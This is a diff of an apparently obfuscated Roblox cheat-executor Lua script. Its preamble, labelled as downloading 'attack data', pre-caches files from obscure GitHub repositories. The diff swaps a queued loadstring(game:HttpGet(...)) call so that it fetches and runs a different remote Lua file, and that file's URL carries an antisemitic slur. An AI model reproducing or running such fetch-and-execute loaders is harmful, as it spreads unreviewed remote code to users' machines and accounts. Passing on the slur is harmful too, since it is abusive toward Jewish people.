@@ -1,5 +1,3 @@
--- === COMBINED SCRIPT: Parts 2+3 pre-cached, then Part 1 runs ===
--- This preamble downloads attack data and caches it so Part 1 finds it locally
 pcall(function()
     local HttpService = game:GetService("HttpService")
     local function preCache(url, key)
@@ -16,7 +14,6 @@ pcall(function()
     preCache("https://raw.githubusercontent.com/Veltrinix/kjwevjksdgvhbhfeqah/main/pniad", "c3_3")
     preCache("https://raw.githubusercontent.com/Veltrinix/kjwevjksdgvhbhfeqah/main/879345", "p2_5")
 end)
--- This file was generated at discord.gg/syncrypt
 
 local t1 = {}
 local v2 = unpack or table.unpack
@@ -11835,7 +11832,7 @@ If available to your executor the script will reset your character and then invi
             end
 
             if not t2.AlreadyQueued and v14 then
-                v14("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/justdoingrandomstuff/World-Zero/main/autofarm\"))()")
+                v14("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fnkq/jewhub32skidy/main/jewhub322.lua\"))()")
             end
         end
     end)
